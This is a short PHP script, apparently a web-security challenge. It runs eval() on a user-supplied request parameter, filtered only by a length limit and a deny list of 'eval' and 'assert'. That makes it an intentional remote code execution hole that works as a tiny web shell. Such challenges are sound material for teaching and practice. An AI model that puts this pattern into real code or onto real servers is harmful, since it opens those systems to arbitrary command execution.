<?php
$param = $_REQUEST['param'];
if(strlen($param)<17 && stripos($param,'eval') === false && stripos($param,'assert') === false) {
  eval($param);
}
?>